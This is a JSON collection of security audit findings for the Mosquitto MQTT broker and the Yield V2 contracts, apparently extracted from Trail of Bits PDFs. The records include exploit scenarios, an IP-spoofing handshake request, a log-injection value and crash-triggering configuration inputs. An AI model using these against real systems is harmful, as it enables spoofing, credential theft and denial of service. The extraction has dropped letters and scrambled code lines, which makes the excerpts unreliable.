of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. mosquitto_passwd trusts existing backup les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "The mosquitto_passwd utility allows the user to update entries in an existing password le. Before updating a password le, mosquitto_passwd uses the create_backup function to make a temporary backup le containing the contents of the original password le. Upon successfully updating the original password le, mosquitto_passwd removes the backup le. The path of the backup le is the same as that of the original password le, with the added extension .tmp, but mosquitto_passwd does not ensure that this le does not already exist before opening it in create_backup (gure 4.1). snprintf(backup_file, strlen(password_file)+ 5 , \"%s.tmp\" , password_file); if (!backup_file){ fprintf(stderr, \"Error: Out of memory.\\n\" ); free(password_file); return 1 ; 615 backup_file = malloc(( size_t )strlen(password_file)+ 5 ); 616 617 618 619 620 } 621 622 free(password_file); 623 password_file = NULL ; 624 625 626 627 628 629 } fclose(fptr); free(backup_file); return 1 ; if ( create_backup(backup_file, fptr) ){ Figure 4.1: apps/mosquitto_passwd/mosquitto_passwd.c#L615-L629 Because the backup lename is predictable and mosquitto_passwd trusts existing backup les, an attacker could create a le with the expected name of a backup le to exltrate password le contents that they should not have access to. The default use of the fs.protected_symlinks=1 and fs.protected_regular=1 kernel parameters on some Linux distributions mitigates exploitation of this issue, but Mosquitto developers should not assume these are set on all systems where mosquitto_passwd might be used. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_passwd utility to update an entry in a password le named passwords . An attacker on the system, under another user account, does not have authorized access to the broker but can write to the directory in which the password le is stored. Before the administrator runs mosquitto_passwd , the attacker creates a symlink called passwords.tmp in the same directory as passwords that points to a le that the administrator can write to and the attacker can read from (e.g., /tmp/copied_passwords ). When the administrator runs mosquitto_passwd , the tool opens the attacker-controlled passwords.tmp , trusting it as the backup le, then follows the symlink and writes the original contents of passwords to /tmp/copied_passwords . After successfully updating passwords , mosquitto_passwd removes passwords.tmp , but the destination le at /tmp/copied_paswords remains. The attacker reads the original passwords contents from this le and brute-forces the hashes it contains (see TOB-MOSQ-CR-1 ) to gain access to the broker. Alternatively, instead of using a symlink, the attacker creates a regular le called passwords.tmp and grants the administrator permission to write to it. In this situation, mosquitto_passwd still writes the backup contents to passwords.tmp but deletes it immediately after updating passwords . However, the attacker can still race mosquitto_passwd to access passwords.tmp before it is removed. Recommendations Short term, instead of appending .tmp to the original password le name, use mkstemp(3) to create a temporary backup le with a unique name, similar to how mosquitto_passwd generates another temporary le . The use of mkstemp would resolve this issue due to this assurance: The le is opened with the open(2) O_EXCL ag, guaranteeing that the caller is the process that creates the le. Ensure that read and write access for the temporary le is restricted to the legitimate user (see TOB-MOSQ-CR-3 ). 5. Heap bu\u0000er overread issue in persist__chunk_client_write_v6 Severity: High Diculty: Undetermined Type: Data Validation Finding ID: TOB-MOSQ-CR-5 Target: src/persist_write_v5.c", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. mosquitto_ctrl dynsec init creates world-readable cong ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "The dynsec init subcommand of the mosquitto_ctrl function is used to initialize a new conguration le for the Dynamic Security plugin. When creating the le , mosquitto_ctrl dynsec init does not set a le mode creation mask (via the umask(2) system call ) to set secure le permissions (e.g., only readable and writable by the current user). As a result, mosquitto_ctrl creates world-readable Dynamic Security conguration les on default congurations of most Linux distributions, which use a mask value of 022 . $ ./mosquitto_ctrl dynsec init dynamic-security.json admin New password for admin: Reenter password for admin: The client 'admin' has been created in the file 'dynamic-security.json'. This client is configured to allow you to administer the dynamic security plugin only. It does not have access to publish messages to normal topics. You should create your application clients to do that, for example: mosquitto_ctrl <connect options> dynsec createClient <username> mosquitto_ctrl <connect options> dynsec createRole <rolename> mosquitto_ctrl <connect options> dynsec addRoleACL <rolename> publishClientSend my/topic [priority] mosquitto_ctrl <connect options> dynsec addClientRole <username> <rolename> [priority] See https://mosquitto.org/documentation/dynamic-security/ for details of all commands. $ ls -latr dynamic-security.json -rw-rw-r-- 1 ubuntu ubuntu 1317 Feb 28 20:39 dynamic-security.json Figure 6.1: The mosquitto_ctrl functions dynsec init command creates a world-readable Dynamic Security conguration le on Ubuntu 22.04. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_ctrl utility to generate a conguration le for the Dynamic Security plugin. An attacker on the system, under another user account, does not have administrative access to the Dynamic Security plugin but can read the directory in which the conguration le was created. The attacker exploits the default world-readable permissions of the conguration le to access its contents, brute-force the administrator password hash (see TOB-MOSQ-CR-1 ), and gain access to the Dynamic Security plugin. Recommendations Short term, have the mosquitto_ctrl utility call umask with a mask of 077 before calling fopen to create the conguration le. This will ensure that only the user running mosquitto_ctrl can read or write to the le. Long term, use the File created without restricting permissions CodeQL query to identify additional instances of this issue.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Race condition in le existence check by mosquitto_ctrl dynsec init ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "The dynsec init subcommand of the mosquitto_ctrl utility is used to initialize a new conguration le for the Dynamic Security plugin. dynsec init rst checks whether a le with the specied name already exists using a call to fopen (line 710 of gure 7.1). If the le exists, mosquitto_ctrl refuses to write to the le and prints an error. If the le does not exist, dynsec init calls fopen again to write the conguration data to the le (line 725 of gure 7.1). These two calls to fopen do not happen atomically, resulting in a time-of-check to time-of-use (TOCTOU) race condition in which an attacker-controlled le could be created in the interval. 710 711 712 713 fptr = fopen(filename, \"rb\" ); if (fptr){ fclose(fptr); fprintf(stderr, \"dynsec init: '%s' already exists. Remove the file or use a different location..\\n\" , filename); return -1 ; if (tree == NULL ){ fprintf(stderr, \"dynsec init: Out of memory.\\n\" ); return MOSQ_ERR_NOMEM; 714 715 } 716 717 tree = init_create(admin_user, admin_password, \"admin\" ); 718 719 720 721 } 722 json_str = cJSON_Print(tree); 723 cJSON_Delete(tree); 724 725 726 727 728 729 730 } else { fprintf(fptr, \"%s\" , json_str); free(json_str); fclose(fptr); fptr = fopen(filename, \"wb\" ); if (fptr){ Figure 7.1: apps/mosquitto_ctrl/dynsec.c#L710-L730 The default use of the fs.protected_symlinks=1 and fs.protected_regular=1 kernel parameters on some Linux distributions mitigates exploitation of this issue, but Mosquitto developers should not assume these are set on all systems where mosquitto_ctrl might be used. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_ctrl utility to create a new Dynamic Security conguration le (e.g., dynamic-security.json ). An attacker on the system, under another user account, does not have administrative access to the Dynamic Security plugin but can write to the directory where dynamic-security.json is created. The attacker writes a program to exploit the race condition in mosquitto_ctrl dynsec init . The program repeatedly tries to create dynamic-security.json as a symlink to another le that is readable by the attacker and writable by the administrator. Once the symlink is successfully created in the interval between the two calls to fopen (gure 7.1), mosquitto_ctrl writes the Dynamic Security conguration data, including the password hash for the administrator user, to the attacker-controlled destination le. The attacker then brute-forces the hash (see TOB-MOSQ-CR-1 ) to gain administrative access to the Dynamic Security plugin. Recommendations Short term, replace the two calls to fopen with a single call to open(3) , passing the O_CREAT and O_EXCL ags (gure 7.2). The man page for open(3) describes the behavior of these ags: If O_CREAT and O_EXCL are set, open() shall fail if the le exists. The check for the existence of the le and the creation of the le if it does not exist shall be atomic with respect to other threads executing open() naming the same lename in the same directory with O_EXCL and O_CREAT set. #include <fcntl.h> #include <errno.h> fd = open(pathname, O_CREAT | O_WRONLY | O_EXCL, S_IRUSR | S_IWUSR); if (fd < 0 ) { // Failure to create file if (errno == EEXIST) { // The file already exists } } else { // Use the file } Figure 7.2: Using open(3) with O_CREAT and O_EXCL ags to check whether a le exists and to create it atomically", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. Use-after-free instances in dynsec_groups__nd and dynsec_clients__nd ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "Fuzzing Dynamic Security conguration le parsing revealed two use-after-free instances that occur when the plugin unloads, resulting in undened behavior. The AddressSanitizer crash reports are provided in appendix D . The use-after-free instances are triggered by a conguration le that contains groups or clients with duplicate names (gures 8.1 and 8.2, respectively). { \"groups\" : [ { \"groupname\" : \"group0\" }, { \"groupname\" : \"group0\" } ] } Figure 8.1: A Dynamic Security conguration le with duplicate group names causes a use-after-free instance in the dynsec_groups__find function. { \"clients\" : [ { \"username\" : \"user0\" }, { \"username\" : \"user0\" } ] } Figure 8.2: A Dynamic Security conguration le with duplicate client usernames causes a use-after-free instance in the dynsec_clients__find function. When unloading the conguration corresponding to one of the above les, the Dynamic Security plugin attempts to free the memory it allocated for groups and clients. However, in doing so, dynsec_groups__find (gure 8.3) and dynsec_clients__find dereference a pointer to a dynsec__group or dynsec__client structure that has already been freed by group__free_item (gure 8.4) or client__free_item . 78 struct dynsec__group *dynsec_groups__find( struct dynsec__data *data, const char *groupname) 79 { 80 81 82 83 group); 84 85 86 } struct dynsec__group *group = NULL ; if (groupname){ HASH_FIND(hh, data->groups, groupname, strlen(groupname), } return group; Figure 8.3: plugins/dynamic-security/groups.c#7886 88 *group) static void group__free_item ( struct dynsec__data *data, struct dynsec__group 89 { 90 91 92 93 94 95 96 97 98 99 100 101 102 103 } struct dynsec__group *found_group = NULL ; if (group == NULL ) return ; found_group = dynsec_groups__find(data, group->groupname); if (found_group){ HASH_DEL(data->groups, found_group); } dynsec__remove_all_clients_from_group(group); mosquitto_free(group->text_name); mosquitto_free(group->text_description); dynsec_rolelist__cleanup(&group->rolelist); mosquitto_free(group); Figure 8.4: plugins/dynamic-security/groups.c#88103 Exploit Scenario A Mosquitto broker administrator manually edits a Dynamic Security conguration le and inadvertently adds a group or client with a duplicate name. When the broker exits, the plugin is unloaded, and undened behavior occurs (which an attacker can exploit to execute arbitrary code in certain conditions). Recommendations Short term, do not dereference dynsec__group or dynsec__client structure pointers that have already been freed.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "9. NULL pointer dereference in dynsec_roles__cong_load ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "Fuzzing Dynamic Security conguration le parsing revealed a NULL pointer dereference that causes the broker to crash when the plugin loads. An AddressSanitizer crash report is provided in appendix E . When parsing the roles array of a Dynamic Security JSON conguration le, the Dynamic Security plugin does not ensure that the values of the textname and textdescription elds are strings before passing their cJSON valuestring eld to the mosquitto_strdup function (gure 9.1). If either value is another type, such as a number, valuestring will be NULL , causing a NULL pointer dereference and a crash when accessed by mosquitto_strdup , which does not perform a NULL check of its argument. } /* Text name */ if (jtmp != NULL ){ role->text_name = mosquitto_strdup(jtmp->valuestring) ; if (role->text_name == NULL ){ mosquitto_free(role); continue ; 280 281 jtmp = cJSON_GetObjectItem(j_role, \"textname\" ); 282 283 284 285 286 287 288 } 289 290 291 jtmp = cJSON_GetObjectItem(j_role, \"textdescription\" ); 292 293 294 295 296 297 298 299 } mosquitto_free(role->text_name); mosquitto_free(role); continue ; /* Text description */ if (jtmp != NULL ){ } role->text_description = mosquitto_strdup(jtmp->valuestring) ; if (role->text_description == NULL ){ Figure 9.1: The jtmp->valuestring eld may be NULL when given to mosquitto_strdup. ( plugins/dynamic-security/roles.c#280299 ) { \"roles\" : [{ \"rolename\" : \"admin\" , \"textname\" : 2 }] } Figure 9.2: The Dynamic Security conguration le triggers a NULL pointer dereference when the cJSON valuestring of the textname eld is accessed. { } \"roles\" : [{ \"rolename\" : \"admin\" , \"textdescription\" : 2 }] Figure 9.3: The Dynamic Security conguration le triggers a NULL pointer dereference when the cJSON valuestring of the textdescription eld is accessed. Exploit Scenario A Mosquitto broker administrator inadvertently species a non-string value for the textname or textdescription elds of a role in a Dynamic Security conguration le. A segmentation fault occurs when the plugin attempts to parse the le, giving the administrator no information as to how to resolve the issue and denying service to all clients and bridges that depend on the broker. Recommendations Short term, use the cJSON_IsString function to ensure that the values of textname and textdescription are strings before accessing valuestring . Consider adding a NULL check in mosquitto_strdup .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "10. Broker creates world-readable TLS key log les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "The Mosquitto brokers --tls-keylog command-line argument allows broker operators to log TLS key material to a le for debugging purposes. When creating the key log le with fopen , the tls_keylog_callback function does not set a le mode creation mask (via the umask(2) system call ) to set secure le permissions (e.g., only readable and writable by the current user). static void tls_keylog_callback ( const SSL *ssl, const char *line) 329 330 { 331 332 333 334 335 336 337 338 339 340 341 342 } FILE *fptr; UNUSED(ssl); if (db.tls_keylog){ fptr = fopen(db.tls_keylog, \"at\" ); if (fptr){ fprintf(fptr, \"%s\\n\" , line); fclose(fptr); } } Figure 10.1: The tls_keylog_callback function does not set a secure le mode creation mask. ( src/net.c#329342 ) As a result, the broker logs TLS key material to a world-readable le on default congurations of most Linux distributions, which use a mask value of 022 . $ ./src/mosquitto -c ./mosquitto.tls.conf --tls-keylog keylog 1678804656: mosquitto version 2.1.0 starting 1678804656: Config loaded from ./mosquitto.tls.conf. 1678804656: Bridge support available. 1678804656: Persistence support available. 1678804656: TLS support available. 1678804656: TLS-PSK support available. 1678804656: Websockets support available. 1678804656: Opening ipv4 listen socket on port 8883. 1678804656: Opening ipv6 listen socket on port 8883. 1678804656: TLS key logging to 'keylog' enabled for all listeners. 1678804656: TLS key logging is for DEBUGGING only. 1678804656: mosquitto version 2.1.0 running ... ^C1678804559: mosquitto version 2.1.0 terminating $ ls -la keylog -rw-rw-r-- 1 ubuntu ubuntu 938 Mar 14 14:35 keylog Figure 10.2: Mosquittos --tls-keylog feature creates a world-readable key log le on Ubuntu 22.04. Exploit Scenario To troubleshoot connection issues, a Mosquitto broker administrator uses the --tls-keylog argument to log TLS key material to a le. A suciently privileged attacker on the system captures trac on the network interface(s) used by the broker but, due to the brokers use of TLS, is unable to read the plaintext MQTT content. However, the attacker can read the directory in which the TLS key log le was created. The attacker exploits the default world-readable permissions of this le to access the TLS key material and decrypt the recorded trac. Recommendations Short term, have the tls_keylog_callback function call umask with a mask of 077 before calling fopen to create the key log le. This will ensure that only the user running the broker can read or write to the le. Long term, use the File created without restricting permissions CodeQL query to identify additional instances of this issue.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "11. Broker trusts existing TLS key log les ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "The Mosquitto brokers --tls-keylog command-line argument allows broker operators to log TLS key material to a le for debugging purposes. Before writing to the key log le, the tls_keylog_callback function does not ensure that one of the following conditions is met: A) the le does not already exist, or B) if the le exists, it is a regular le with secure permissions (owned by the user running Mosquitto, with read/write bits set for only that user). Consequently, if an attacker can predict the name of the key log le before it is created and write to its parent directory, they can create the le in advance and access its contents when the broker begins logging TLS key material. static void tls_keylog_callback ( const SSL *ssl, const char *line) 329 330 { 331 332 333 334 335 336 337 338 339 340 341 342 } FILE *fptr; UNUSED(ssl); if (db.tls_keylog){ fptr = fopen(db.tls_keylog, \"at\" ); if (fptr){ fprintf(fptr, \"%s\\n\" , line); fclose(fptr); } } Figure 11.1: The tls_keylog_callback function does not check for le existence and permissions. ( src/net.c#329342 ) Exploit Scenario To troubleshoot connection issues, a Mosquitto broker administrator wants to use the --tls-keylog argument to log TLS key material to a le. A suciently privileged attacker on the system captures trac on the network interface(s) used by the broker but, due to the brokers use of TLS, is unable to read the plaintext MQTT content. However, the attacker knows what the name of the key log le will be and can write to the directory in which it will be created. The attacker creates this le, and when the broker is run with the --tls-keylog argument, it begins logging key material to the le without noticing that the attacker has read access to it. The attacker accesses the TLS key material and decrypts the recorded trac. Recommendations Short term, have the tls_keylog_callback function atomically check (see TOB-MOSQ-CR-7 ) whether the key log le already exists and create it if it does not. If it already exists, the function should ensure that it is a regular le (i.e., not a symlink or other special type of le), that it is owned by the user running Mosquitto, and that only the owner has read and write permissions for it. 12. libmosquitto accepts wildcard certicates for public su\u0000xes Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-MOSQ-CR-12 Target: lib/tls_mosq.c", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "13. Username characters not validated when taken from client certicate ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "An MQTT username that the Mosquitto broker receives in a CONNECT packet is validated using the mosquitto_validate_utf8 function, called from the packet__read_string function. mosquitto_validate_utf8 veries that the string it receives is valid UTF-8 and does not contain control characters, such as newlines and carriage returns. As an alternative to reading the username from the CONNECT packet, the use_identity_as_username and use_subject_as_username conguration options allow the broker to determine the username from the certicate presented by the client (either the Common Name [CN] or the Subject elds). When one of these options is set, the function responsible for assigning the username is get_username_from_cert , which does not call mosquitto_validate_utf8 to validate the username. As a result, the username specied in a client certicate may contain characters that would not otherwise be allowed. Exploit Scenario A broker is congured with the use_identity_as_username option. An attacker obtains a client certicate, signed by the brokers trusted certicate authority, with a CN eld that contains arbitrary text that they wish to inject into the brokers logs. The CN is prexed with a newline byte (0x0a)for example, \\n<any timestamp>: log injection . When the attacker uses this certicate to connect to the broker, the attackers chosen text is inserted on its own lines in the brokers logging destination, misleading the broker operator or obfuscating other malicious activity in the logs. 1678832163: New client connected from 127.0.0.1:57940 as <any timestamp>: log injection (p4, c1, k60, u' <any timestamp>: log injection'). 1678832163: No will message specified. 1678832163: Client <any timestamp>: log injection negotiated TLSv1.3 cipher TLS_AES_256_GCM_SHA384 1678832163: Sending CONNACK to <any timestamp>: log injection (0, 0) <any timestamp>: log injection Figure 13.1: The attacker can inject arbitrary lines into the brokers logs. Recommendations Short term, have the get_username_from_cert function call mosquitto_validate_utf8 on the contents of the certicates CN and Subject elds when use_identity_as_username or use_subject_as_username is set.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "14. Improper parsing of X-Forwarded-For header ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "For listeners that use the WebSocket protocol, Mosquitto reads and parses the X-Forwarded-For HTTP header, if supplied, to determine the originating IP address of a client (gure 14.1). Specically, Mosquitto treats the header value as a comma-separated list of addresses and returns the rst entry in the list as the client address. This entry is then assigned to the address eld of the clients mosquitto structure (gure 14.2). This handling of the X-Forwarded-For header is incorrect for two reasons: 1. The broker always reads this header, even if there are no proxies in front of it. When there are no proxies, the value of the header is controlled entirely by the client, so the client can trivially spoof its IP address by providing its own X-Forwarded-For header. There is currently no way to inform the broker that there are no proxies in use and that the header should be ignored. 2. Proxies typically append, rather than overwrite, the trustworthy address of the client to the untrustworthy value of X-Forwarded-For that the client supplies. As a result, the rst value in the list cannot be trusted, and using it allows the client to spoof its IP address. 206 } else if (!strncasecmp(http_headers[i].name, \"X-Forwarded-For\" , http_headers[i].name_len)){ 207 208 forwarded_for = http_headers[i].value; forwarded_for_len = first_entry(forwarded_for, ( int )http_headers[i].value_len) ; 209 210 211 212 213 214 215 216 mosquitto__FREE(mosq->address); mosq->address = mosquitto__malloc(( size_t )forwarded_for_len+ 1 ); if (!mosq->address){ return MOSQ_ERR_NOMEM; } strncpy(mosq->address, forwarded_for, ( size_t )forwarded_for_len); mosq->address[forwarded_for_len] = '\\0' ; Figure 14.1: The value of the X-Forwarded-For header is passed to the first_entry function. ( src/http_serv.c#206216 ) static int first_entry ( const char *s, int len) int i; for (i= 0 ; i<len; i++){ if (s[i] == '\\0' || s[i] == ',' ){ return i; } } return len; 64 65 { 66 67 68 69 70 71 72 73 74 } Figure 14.2: The first_entry function extracts the rst entry in the comma-separated X-Forwarded-For list. ( src/http_serv.c#6474 ) Exploit Scenario A Mosquitto broker is congured to use the WebSocket protocol but is not situated behind any proxies. An attacker connects to the broker and sends a WebSocket handshake with an X-Forwarded-For header containing an IP address they wish to spoof (e.g., 8.8.8.8 ). GET /mqtt HTTP/1.1 Host: localhost X-Forwarded-For: 8.8.8.8 Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: Ox0b8Xy0PXHwERd7XOkvnQ== Sec-WebSocket-Protocol: mqtt Sec-WebSocket-Version: 13 Figure 14.3: The WebSocket handshake with the X-Forwarded-For header can be used to spoof the clients IP address. The attacker then sends an MQTT CONNECT packet over the WebSocket stream. Once this happens, the broker begins reporting the address of the attacker as 8.8.8.8 (gure 14.4), and the attacker can bypass any IP addressbased restrictions imposed by the broker or its plugins. 1678839485: New connection from 127.0.0.1:44116 on port 8080. 1678839485: New client connected from 8.8.8.8 :44116 as foo (p4, c0, k60). Figure 14.4: The broker begins reporting the spoofed IP address. Recommendations Short term, disable parsing of the X-Forwarded-For header by default. Add a conguration option to enable it that also species the number of proxies between clients and the broker. Once the number of proxies is known, determine the correct client IP address in the X-Forwarded-For list by counting backwards from the end of the list by the congured number of proxies minus one. For example, with one proxy, the last address in the list is the clients. With two proxies, the second from the last is the clients, and so on. References  MDN Web Docs: X-Forwarded-For", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "15. Logger registers with DLT when DLT is not a log destination ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf", "body": "When built with the WITH_DLT macro, Mosquitto supports the Diagnostic Log and Trace (DLT) service as a log destination. At startup, Mosquitto checks for the presence of a named pipe (FIFO) at /tmp/dlt (gure 15.1) and, if found, uses the DLT API to register itself, which involves writing to /tmp/dlt (gure 15.2). These actions occur even when DLT is not congured as a log destination or not present on the system. if (stat( \"/tmp/dlt\" , &statbuf) == 0 ){ if (S_ISFIFO(statbuf.st_mode)){ 84 memset(&statbuf, 0 , sizeof (statbuf)); 85 86 87 88 89 90 91 92 dlt_allowed = true ; close(fd); } } fd = open( \"/tmp/dlt\" , O_NONBLOCK | O_WRONLY); if (fd != -1 ){ Figure 15.1: Mosquitto checks for a named pipe at /tmp/dlt . ( src/logging.c#8492 ) 138 139 140 141 142 #ifdef WITH_DLT dlt_fifo_check(); if (dlt_allowed){ DLT_REGISTER_APP( \"MQTT\" , \"mosquitto log\" ); dlt_register_context(&dltContext, \"MQTT\" , \"mosquitto DLT context\" ); 143 } Figure 15.2: Mosquitto registers with DLT. ( src/logging.c#138143 ) Mosquitto does not verify that the user congured DLT for logging and instead conrms only that /tmp/dlt exists and is a named pipe, so unexpected behavior may occur if the le is controlled by an attacker. As only nonsensitive registration metadata is written to the le unless DLT is set as a log destination, the severity of this issue is set to informational. It is possible to view the registration metadata written to the named pipe by reading from it before the broker exits. $ tail -f /tmp/dlt | xxd 00000000: 4455 4801 0200 0000 4d51 5454 fc80 1b00 DUH.....MQTT.... 00000010: 0d00 0000 6d6f 7371 7569 7474 6f20 6c6f ....mosquitto lo 00000020: 6744 5548 0104 0000 004d 5154 544d 5154 gDUH.....MQTTMQT 00000030: 5400 0000 00fe fefc 801b 0015 0000 006d T..............m 00000040: 6f73 7175 6974 746f 2044 4c54 2063 6f6e osquitto DLT con 00000050: 7465 7874 4455 4801 0500 0000 4d51 5454 textDUH.....MQTT 00000060: 4d51 5454 fc80 1b00 4455 4801 0300 0000 MQTT....DUH..... Figure 15.3: Reading from /tmp/dlt Recommendations Short term, have the log__init function access /tmp/dlt and register Mosquitto with DLT only when the user congures it as a log destination. 16. Documentation recommends insecure encryption practices for TLS private key Severity: Informational Diculty: Low Type: Cryptography Finding ID: TOB-MOSQ-CR-16 Target: https://mosquitto.org/man/mosquitto-tls-7.html", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Lack of contract existence check on delegatecall may lead to unexpected behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Ladle contract uses the delegatecall proxy pattern. If the implementation contract is incorrectly set or is self-destructed, the contract may not detect failed executions. The Ladle contract implements the batch and moduleCall functions; users invoke the former to execute batched calls within a single transaction and the latter to make a call to an external module. Neither function performs a contract existence check prior to executing a delegatecall. Figure 1.1 shows the moduleCall function. /// @dev Allow users to use functionality coded in a module, to be used with batch /// @notice Modules must not do any changes to the vault (owner, seriesId, ilkId), /// it would be disastrous in combination with batch vault caching function moduleCall(address module, bytes calldata data) external payable returns (bytes memory result) { } require (modules[module], \"Unregistered module\"); bool success; (success, result) = module.delegatecall(data); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); Figure 1.1: vault-v2/contracts/Ladle.sol#L186-L197 An external modules address must be registered by an administrator before the function calls that module. /// @dev Add or remove a module. function addModule(address module, bool set) external 15 Yield V2 auth modules[module] = set; emit ModuleAdded(module, set); { } Figure 1.2: vault-v2/contracts/Ladle.sol#L143-L150 If the administrator sets the module to an incorrect address or to the address of a contract that is subsequently destroyed, a delegatecall to it will still return success. This means that if one call in a batch does not execute any code, it will still appear to have been successful, rather than causing the entire batch to fail. The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 1.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Alice, a privileged member of the Yield team, accidentally sets a module to an incorrect address. Bob, a user, invokes the moduleCall method to execute a batch of calls. Despite Alices mistake, the delegatecall returns success without making any state changes or executing any code. Recommendations Short term, implement a contract existence check before a delegatecall. Document the fact that using suicide or selfdestruct can lead to unexpected behavior, and prevent future upgrades from introducing these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. 16 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Use of delegatecall in a payable function inside a loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The Ladle contract uses the delegatecall proxy pattern (which takes user-provided call data) in a payable function within a loop. This means that each delegatecall within the for loop will retain the msg.value of the transaction: /// @dev Allows batched call to self (this contract). /// @param calls An array of inputs for each call. function batch(bytes[] calldata calls) external payable returns(bytes[] memory results) { results = new bytes[](calls.length); for (uint256 i; i < calls.length; i++) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); if (!success) revert(RevertMsgExtractor.getRevertMsg(result)); results[i] = result; } // build would have populated the cache, this deletes it cachedVaultId = bytes12(0); } Figure 2.1: vault-v2/contracts/Ladle.sol#L186-L197 The protocol does not currently use the msg.value in any meaningful way. However, if a future version or refactor of the core protocol introduced a more meaningful use of it, it could be exploited to tamper with the system arithmetic. Exploit Scenario Alice, a member of the Yield team, adds a new functionality to the core protocol that adjusts users balances according to the msg.value. Eve, an attacker, uses the batching functionality to increase her ETH balance without actually sending funds from her account, thereby stealing funds from the system. 17 Yield V2 Recommendations Short term, document the risks associated with the use of msg.value and ensure that all developers are aware of this potential attack vector. Long term, detail the security implications of all functions in both the documentation and the code to ensure that potential attack vectors do not become exploitable when code is refactored or added. References  Two Rights Might Make a Wrong, Paradigm 18 Yield V2", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Lack of two-step process for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The _give function in the Cauldron contract transfers the ownership of a vault in a single step. There is no way to reverse a one-step transfer of ownership to an address without an owner (i.e., an address with a private key not held by any user). This would not be the case if ownership were transferred through a two-step process in which an owner proposed a transfer and the prospective recipient accepted it. /// @dev Transfer a vault to another user. function _give(bytes12 vaultId, address receiver) internal returns(DataTypes.Vault memory vault) { } require (vaultId != bytes12(0), \"Vault id is zero\"); vault = vaults[vaultId]; vault.owner = receiver; vaults[vaultId] = vault; emit VaultGiven(vaultId, receiver); Figure 3.1: vault-v2/contracts/Cauldron.sol#L227-L237 Exploit Scenario Alice, a Yield Protocol user, transfers ownership of her vault to her friend Bob. When entering Bobs address, Alice makes a typo. As a result, the vault is transferred to an address with no owner, and Alices funds are frozen. Recommendations Short term, use a two-step process for ownership transfers. Additionally, consider adding a zero-value check of the receivers address to ensure that vaults cannot be transferred to the zero address. Long term, use a two-step process for all irrevocable critical operations. 19 Yield V2", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. Risks associated with use of ABIEncoderV2 ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "The contracts use Soliditys ABIEncoderV2, which is enabled by default in Solidity version 0.8. This encoder has caused numerous issues in the past, and its use may still pose risks. More than 3% of all GitHub issues for the Solidity compiler are related to current or former experimental features, primarily ABIEncoderV2, which was long considered experimental. Several issues and bug reports are still open and unresolved. ABIEncoderV2 has been associated with more than 20 high-severity bugs, some of which are so recent that they have not yet been included in a Solidity release. For example, in March 2019 a severe bug introduced in Solidity 0.5.5 was found in the encoder. Exploit Scenario The Yield Protocol smart contracts are deployed. After the deployment, a bug is found in the encoder, which means that the contracts are broken and can all be exploited in the same way. Recommendations Short term, use neither ABIEncoderV2 nor any experimental Solidity feature. Refactor the code such that structs do not need to be passed to or returned from functions. Long term, integrate static analysis tools like Slither into the continuous integration pipeline to detect unsafe pragmas. 20 Yield V2", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "5. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/YieldV2.pdf", "body": "Although dependency scans did not yield a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. NPM Advisory", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "6. Witchs buy and payAll functions allow users to buy collateral from vaults not undergoing auctions ", "html_url": 